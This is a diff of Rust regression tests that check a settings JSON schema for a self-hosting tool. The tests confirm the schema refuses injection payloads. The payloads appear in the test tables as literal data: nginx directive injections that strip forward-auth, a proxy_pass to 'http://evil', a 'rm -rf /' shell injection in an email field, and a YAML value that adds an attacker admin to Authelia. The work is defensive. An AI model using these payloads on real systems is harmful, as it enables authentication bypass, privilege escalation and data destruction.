@@ -250,14 +250,22 @@ mod tests {
 
     // --- the `pattern` guards on the write path ------------------------
     //
-    // H-01 put a JSON-Schema `pattern` on `daemon.listenAddress`,
-    // `proxy.baseDomain` and `daemon.subdomain`, because those three are
-    // interpolated into nginx directives and an unconstrained string there
-    // was a real, served injection. Three layers now refuse a bad value --
-    // this `pattern` at the WRITE, `addressLiteral`/`dnsLabel` at NixOS
-    // evaluation, and `isOctet`'s parse -- and until now only the latter
-    // two had any regression pin at all: `wronglyAcceptedInjection` is a
-    // Nix eval fixture, and nothing exercised the schema itself.
+    // EIGHT settings-writable values reach a sink that parses them. H-01
+    // constrained three (`daemon.listenAddress`, `proxy.baseDomain`,
+    // `daemon.subdomain`); SEC-01 and SEC-02 found the same class still
+    // open on `proxy.trustedNetworks[]` and `apps.*.auth.bypassPaths[]`,
+    // and the sweep that followed added `proxy.acme.email`,
+    // `auth.adminEmail` and `apps.*.subdomain`. Six of the eight land in an
+    // nginx directive, one reaches a shell, and one reaches Authelia's
+    // users_database.yml -- the file that decides who may log in.
+    //
+    // Several layers refuse a bad value now -- this `pattern` at the WRITE,
+    // the NixOS option types at evaluation, `isOctet`'s parse, and (for the
+    // Authelia document) the escaping in
+    // crates/ferrum-apply/src/secrets.rs -- and until now the write-path
+    // layer had no regression pin at all: `wronglyAcceptedInjection` and
+    // the fixtures beside it are Nix EVAL checks, so nothing tested that
+    // the schema itself refuses a bad write.
     //
     // WHAT THESE TESTS DO AND DO NOT HOLD, stated because a pin that is
     // believed to cover more than it does is worse than none. They drive
@@ -272,12 +280,16 @@ mod tests {
     // widened, which is a change to nix/, and it has been raised rather
     // than guessed at.
 
-    /// The three patterns as shipped in `modules/lib/settings-schema.json`.
+    /// The patterns as shipped in `modules/lib/settings-schema.json`: six
+    /// constants covering all eight guarded sites, since `daemon.subdomain`
+    /// shares one with `apps.*.subdomain` and `proxy.acme.email` with
+    /// `auth.adminEmail`.
     ///
-    /// Copied, and that copy is the limitation above. Kept as one constant
-    /// rather than inline per test so there is a single place to compare
-    /// against the real file by eye, and one place to point at from the
-    /// change that makes the comparison mechanical.
+    /// Copied, and that copy is the limitation above. Grouped here rather
+    /// than inlined per test so there is a single place to compare against
+    /// the real file, and one place to point at from the change that makes
+    /// the comparison mechanical. All eight sites were compared
+    /// byte-for-byte when this was written.
     const LISTEN_ADDRESS_PATTERN: &str = concat!(
         r"^(127\.(0|[1-9][0-9]?|1[0-9][0-9]|2[0-4][0-9]|25[0-5])",
         r"\.(0|[1-9][0-9]?|1[0-9][0-9]|2[0-4][0-9]|25[0-5])",
@@ -298,6 +310,27 @@ mod tests {
     const BASE_DOMAIN_PATTERN: &str =
         r"^([A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)*)?$";
 
+    /// `proxy.acme.email` and `auth.adminEmail`, which share one pattern.
+    ///
+    /// Two different sinks, both outside nginx. The ACME address reaches a
+    /// shell; `auth.adminEmail` reaches
+    /// `crates/ferrum-apply/src/secrets.rs`'s Authelia `users_database.yml`
+    /// -- the file that decides who may log in to every gated app and to
+    /// the control plane. Optional for the same reason `baseDomain` is:
+    /// empty means "not configured".
+    const EMAIL_PATTERN: &str = r"^([A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*)?$";
+
+    /// `proxy.trustedNetworks[]`, which is emitted as `allow ${net};`
+    /// BEFORE the `deny all` and `auth_request` that follow it -- so an
+    /// injected `}` closed `location /` before the gate was ever emitted,
+    /// and a real nginx served the application with forward-auth absent.
+    const TRUSTED_NETWORK_PATTERN: &str = r"^[0-9A-Fa-f.:]+(/[0-9]{1,3})?$";
+
+    /// `apps.<name>.auth.bypassPaths[]`, which becomes a location NAME
+    /// (`location ${path} {`) and an Authelia regex. This one deletes
+    /// `auth_request` from catalog apps.
+    const BYPASS_PATH_PATTERN: &str = r"^/[A-Za-z0-9._~%/-]*$";
+
     /// A schema carrying the real patterns, and its path.
     ///
     /// No environment variable: see `validate_against_schema_at`.
@@ -311,11 +344,51 @@ mod tests {
                         "properties": {
                             "enable": { "type": "boolean" },
                             "baseDomain": { "type": "string", "pattern": BASE_DOMAIN_PATTERN },
+                            "acme": {
+                                "type": "object",
+                                "properties": {
+                                    "email": { "type": "string", "pattern": EMAIL_PATTERN },
+                                },
+                            },
+                            "trustedNetworks": {
+                                "type": "array",
+                                "items": {
+                                    "type": "string",
+                                    "pattern": TRUSTED_NETWORK_PATTERN,
+                                },
+                            },
                         },
                     },
                     "auth": {
                         "type": "object",
-                        "properties": { "enable": { "type": "boolean" } },
+                        "properties": {
+                            "enable": { "type": "boolean" },
+                            "adminEmail": { "type": "string", "pattern": EMAIL_PATTERN },
+                        },
+                    },
+                    "apps": {
+                        "type": "object",
+                        "additionalProperties": {
+                            "type": "object",
+                            "properties": {
+                                "subdomain": {
+                                    "type": "string",
+                                    "pattern": DNS_LABEL_PATTERN,
+                                },
+                                "auth": {
+                                    "type": "object",
+                                    "properties": {
+                                        "bypassPaths": {
+                                            "type": "array",
+                                            "items": {
+                                                "type": "string",
+                                                "pattern": BYPASS_PATH_PATTERN,
+                                            },
+                                        },
+                                    },
+                                },
+                            },
+                        },
                     },
                     "daemon": {
                         "type": "object",
@@ -332,15 +405,19 @@ mod tests {
         }))
     }
 
-    /// The write-path half of H-01's defence, on all three fields.
+    /// The write-path half of the defence, on every guarded field.
     ///
-    /// The payloads are the real ones: `listenAddress` is interpolated into
-    /// `proxy_pass`, and `baseDomain` into `server_name` and into
-    /// `error_page 401 =302 https://auth.${baseDomain}/...`. A `;` or a
-    /// newline in either closes the directive and opens another, which is
-    /// how a real nginx came to serve a smuggled block.
+    /// The payloads are the real ones, several of them served against a
+    /// real nginx by the security review rather than argued: `listenAddress`
+    /// is interpolated into `proxy_pass`, `baseDomain` into `server_name`
+    /// and into `error_page 401 =302 https://auth.${baseDomain}/...`,
+    /// `trustedNetworks[]` into `allow ${net};` ahead of the gate it is
+    /// supposed to sit behind, and `bypassPaths[]` into a location name. A
+    /// `;` or a `}` in any of them closes the directive and opens another,
+    /// which is how a real nginx came to serve an application with
+    /// forward-auth absent entirely.
     #[test]
-    fn the_schema_refuses_every_injection_payload_on_the_nginx_interpolated_fields() {
+    fn the_schema_refuses_every_injection_payload_on_the_pattern_guarded_fields() {
         let (_dir, schema) = schema_with_patterns();
         let cases: &[(&str, serde_json::Value)] = &[
             (
@@ -379,6 +456,51 @@ mod tests {
                 "a subdomain closing its own location block",
                 serde_json::json!({"daemon": {"subdomain": "ferrum} location /x {"}}),
             ),
+            // SEC-01. The payload the security review SERVED against a real
+            // nginx: because the allow-list is concatenated BEFORE the
+            // `deny all` and `auth_request`, the injected `}` closes
+            // `location /` and the gate is never emitted at all.
+            (
+                "a trusted network closing the location it is meant to guard",
+                serde_json::json!({"proxy": {"trustedNetworks": [
+                    "127.0.0.1; } location /anything { proxy_pass http://127.0.0.1:8989; #"
+                ]}}),
+            ),
+            (
+                "a trusted network that is not an address at all",
+                serde_json::json!({"proxy": {"trustedNetworks": ["all; #"]}}),
+            ),
+            // SEC-02. Same class, and materially worse: this one deletes
+            // auth_request from a catalog app rather than from the daemon.
+            (
+                "a bypass path closing its own location block",
+                serde_json::json!({"apps": {"sonarr": {"auth": {"bypassPaths": [
+                    "/api} location / { proxy_pass http://evil; #"
+                ]}}}}),
+            ),
+            (
+                "a bypass path that is not rooted, so it is not a path",
+                serde_json::json!({"apps": {"sonarr": {"auth": {"bypassPaths": ["api"]}}}}),
+            ),
+            (
+                "an app subdomain closing its own server block",
+                serde_json::json!({"apps": {"sonarr": {"subdomain": "sonarr} server {"}}}),
+            ),
+            // The ACME contact address reaches a shell, not a directive.
+            (
+                "an acme email carrying a shell command",
+                serde_json::json!({"proxy": {"acme": {"email": "a@b.co; rm -rf /"}}}),
+            ),
+            // auth.adminEmail reaches Authelia's users_database.yml, the
+            // file that decides who may log in. crates/ferrum-apply/src/
+            // secrets.rs now escapes it too -- this is the boundary half of
+            // that pair, and neither half is the whole defence.
+            (
+                "an admin email that would add a second Authelia admin",
+                serde_json::json!({"auth": {
+                    "adminEmail": "a@example.test\"\n  attacker:\n    groups:\n      - admins"
+                }}),
+            ),
         ];
         for (what, document) in cases {
             assert!(
@@ -400,11 +522,66 @@ mod tests {
             serde_json::json!({"daemon": {"listenAddress": "::1"}}),
             serde_json::json!({"daemon": {"subdomain": "ferrum"}}),
             serde_json::json!({"proxy": {"baseDomain": "home.example.com"}}),
+            serde_json::json!({"proxy": {"trustedNetworks": ["192.168.1.0/24", "10.0.0.0/8"]}}),
+            serde_json::json!({"proxy": {"trustedNetworks": ["::1", "fd00::/8"]}}),
+            serde_json::json!({"proxy": {"acme": {"email": "admin@example.test"}}}),
+            // Empty is legal on both addresses: it is what "not configured"
+            // looks like, and the UI has to be able to write it back.
+            serde_json::json!({"proxy": {"acme": {"email": ""}}}),
+            serde_json::json!({"auth": {"adminEmail": "first.last+tag@example.co.uk"}}),
+            serde_json::json!({"auth": {"adminEmail": ""}}),
+            serde_json::json!({"apps": {"sonarr": {"subdomain": "sonarr"}}}),
+            serde_json::json!({"apps": {"plex": {"auth": {"bypassPaths": [
+                "/api", "/api/v3/", "/web/index.html", "/identity"
+            ]}}}}),
         ];
         for document in cases {
             let result = validate_against_schema_at(&schema, document);
             assert!(result.is_ok(), "the schema refused a legitimate value {document}: {result:?}");
         }
+    }
+
+    /// MEASURED, not reasoned about: does this validator's `$` match
+    /// before a trailing newline?
+    ///
+    /// It matters because every pattern here is anchored with `^...$`. If
+    /// `$` behaved the way it does in Perl and Python -- matching before a
+    /// final `\n` -- then a payload ending in a newline would PASS the
+    /// schema and be caught later at NixOS evaluation instead. That is not
+    /// an injection, because the eval-time type still refuses it, but it
+    /// converts a cleanly refused REQUEST into a broken APPLY: the operator
+    /// gets a 200 from the settings write and a failure on the next
+    /// rebuild, which is precisely the failure mode the write-path guard
+    /// exists to prevent.
+    ///
+    /// The answer, measured against jsonschema 0.18.3: `$` does NOT
+    /// tolerate a trailing newline. `"abc\n"` is refused against `^abc$`.
+    /// So the anchored patterns mean what they look like they mean, and no
+    /// `\A...\z` rewrite is needed.
+    ///
+    /// Deliberately asserted against a throwaway `^abc$` rather than one of
+    /// ferrum's patterns: those have many other reasons to reject a value,
+    /// so a test using one would keep passing if this behaviour changed.
+    /// This isolates the regex engine's anchor semantics and nothing else.
+    ///
+    /// The same fact is what makes the `"127.0.0.1\n"` case in the payload
+    /// table above a real assertion rather than an accidental pass.
+    #[test]
+    fn the_validators_end_anchor_does_not_tolerate_a_trailing_newline() {
+        let (_dir, schema) = schema_file(serde_json::json!({
+            "type": "object",
+            "properties": { "probe": { "type": "string", "pattern": "^abc$" } },
+        }));
+        assert!(
+            validate_against_schema_at(&schema, &serde_json::json!({"probe": "abc"})).is_ok(),
+            "the control must pass, or this test proves nothing"
+        );
+        assert!(
+            validate_against_schema_at(&schema, &serde_json::json!({"probe": "abc\n"})).is_err(),
+            "a trailing newline slipped past `$`: every anchored pattern in the real schema \
+             would then be bypassable by appending one, turning a refused write into a \
+             broken apply"
+        );
     }
 
     // --- SEC-04: auth.enable vs daemon.enable --------------------------
